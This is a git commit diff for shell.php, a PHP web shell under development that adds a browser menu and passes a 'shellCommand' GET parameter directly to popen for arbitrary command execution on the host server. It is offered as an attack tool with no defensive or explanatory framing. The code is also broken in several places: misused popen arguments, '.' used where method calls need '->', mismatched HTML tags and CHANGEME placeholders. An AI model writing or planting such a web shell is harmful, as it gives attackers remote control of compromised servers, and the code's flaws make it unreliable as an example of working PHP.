facb50360b37eb8ed490612ec84d3a8d32cc01f6
IoTh1nkN0t <douwe@debian.douwe>
2016-12-24 00:49:39 +0100

    Improved most

--- shell.php
+++ shell.php
@@ -24,13 +24,13 @@
 		public function doCommand($command)
 		{
 			$mode = $this->mode;
-			echo popen($command,$command);
+			return popen($command,$command);
 		}
 		
 		public function getPwd()
 		{
 			$this->pwd = popen("/bin/pwd",$this->mode);
-			echo $pwd;
+			return $this->pwd;
 		}
 
 		public function cd($path)
@@ -38,21 +38,47 @@
 			chdir($path);
 		}
 	}
+
+	$userInterface = new UserInterface();
+	if(isset($_GET['command'])) {
+		$command = $_GET['command'];
+		switch($command) {
+			case "pwd":
+				$pwd = $userInterface.getPwd();
+				break;
+			case "perm":
+				$permissions = $userInterface.getPermissions();
+				break;
+			case "ps":
+				$processes = $userInterface.getProcesses();
+				break;
+		}
+	}
+	if(isset($_GET['shellCommand'])) {
+		$myCommand = $_GET['shellCommand'];
+		$shellOut = $userInterface.doCommand($myCommand);
+	}
 ?>
 <style rel="stylesheet" type="text/css">
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
+		<form action="#" id="XmenuForm">
 		<ul class="XmenuOptions">
-			<li><span id="XbuttonPwd">
-			<li><span id="XbuttonPerm">
-			<li><span id="XbuttonPs">
+			<li><button type="submit" form="XmenuForm" id="XbuttonPwd" name="command" value="pwd">PWD</div></li>
+			<li><button type="submit" form="XmenuForm" id="XbuttonPerm" name="command" value="perm">Permissions</div></li>
+			<li><button type="submit" form="XmenuForm" id="XbuttonPs" name="command" value="ps">Processes</div></li>
 		</ul>
+		</form>
 	</div>
 	<div id="XmainContainer">
 		<div id="XmainShell">
+			<div id="XoutputShell">
+			</div>
+			<div id="XinputShell">
 			<form action="CHANGEME" method="POST">
-
+			</form>
+			</div>
 		<div id="XsideBar">
 			<ul>
 				<li>Something here?</li>
@@ -61,7 +87,15 @@
 			</ul>
 		</div>
 <script type="text/javascript">
-	
+$(document).ready( function() {
+	$("#menuForm").on('submit', function(e) {
+		e.preventDefault();
+		$.ajax({
+			url: CHANGEME,
+			type: "GET",
+			data: $(this).serialize();
+		});
+	});
+});
 </script>
-
 <!-- Below here should be the closing </body> tag -->
